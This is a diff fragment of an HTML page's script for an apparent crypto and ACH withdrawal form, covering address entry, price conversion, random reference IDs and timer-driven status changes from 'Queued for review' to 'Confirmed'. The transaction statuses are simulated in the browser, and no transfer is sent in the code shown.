+    if(asset==='ACH'){
+      destination=$('#bankInfo').value.trim()||'ACH to bank account';
+    }else{
+      if(asset==='LTC'){
+        destination=$('#addrSel').value;
+      }else{
+        destination=$('#manualAddr').value.trim();
+      }
+      if(!destination) return alert('Enter a valid crypto address');
+      const p=price(asset);
+      if(!p) return alert('Live price unavailable. Please refresh rates and try again.');
+    }
+
+    const p=price(asset);
+    const coin=asset==='ACH'?null:(usd/(p||1));
+    const ref='BR-'+Math.random().toString(36).slice(2,8).toUpperCase();
+    const now=new Date();
+    const t=fmtClock(now)+' '+String(now.getMonth()+1).padStart(2,'0')+'/'+String(now.getDate()).padStart(2,'0')+'/'+now.getFullYear();
+    const status=usd>1000?'Queued for review':'Processing';
+    STATE.history.push({t,method:asset,usd:-usd,coin:coin,to:destination,status,note:(asset==='ACH'?'ACH bank transfer':'Crypto withdrawal'),ref,created:Date.now()});
+    renderHistory(); recompute(); $('#amtUsd').value=''; updateCalc();
+    if(asset!=='LTC' && $('#manualAddr')) $('#manualAddr').value='';
+  }
+
+  function advance(){
+    const now=Date.now(); let changed=false;
+    for(const r of STATE.history){
+      if(r.usd<0 && (r.status==='Processing'||r.status==='Queued for review')){
+        const age=(now-(r.created||now))/1000;
+        if(r.status==='Processing' && age>18){ r.status='Confirmed'; changed=true; }
+        if(r.status==='Queued for review' && age>35){ r.status='Processing'; changed=true; }
+      }
+    }
+    if(changed){ renderHistory(); recompute(); }
+  }
+  setInterval(advance,1500);
+
+  // UI hooks
+  Array.from($$('#methodButtons .method')).forEach(btn=>{
+    btn.addEventListener('click',()=>{
+      const asset=btn.dataset.asset;
+      setAsset(asset);
+    });
+  });
+  function setAsset(asset){
+    if(!METHOD_META[asset]) return;
+    currentAsset=asset;
+    Array.from($$('#methodButtons .method')).forEach(btn=>{
+      const isActive=btn.dataset.asset===asset;
+      btn.classList.toggle('active',isActive);
+      btn.setAttribute('aria-pressed',isActive?'true':'false');
+    });
+    $('#methodDisplay').textContent=METHOD_META[asset].display;
+    $('#networkWrap').style.display=(asset==='USDT')?'':'none';
+    $('#bankWrap').style.display=(asset==='ACH')?'':'none';
+    loadSavedAddrs();
+    updateCalc();
+  }
+
+  $('#usdtNet').addEventListener('change',updateCalc);
+  $('#amtUsd').addEventListener('input',updateCalc);
+  $('#ratesBtn').addEventListener('click',loadPrices);
+  $('#refreshBtn').addEventListener('click',()=>{loadPrices();advance();});
+  $('#submitBtn').addEventListener('click',submit);
+  $$('#quickAmounts .chip').forEach(c=>c.addEventListener('click',()=>{
+    const v=c.getAttribute('data-amt');
+    $('#amtUsd').value=(v==='max'?STATE.available:parseFloat(v)).toFixed(2);
+    updateCalc();
+  }));
+
+  // Init
+  function init(){ renderHistory(); recompute(); setAsset(currentAsset); loadPrices(); }
+  init();
+</script>
+</body>
+</html>
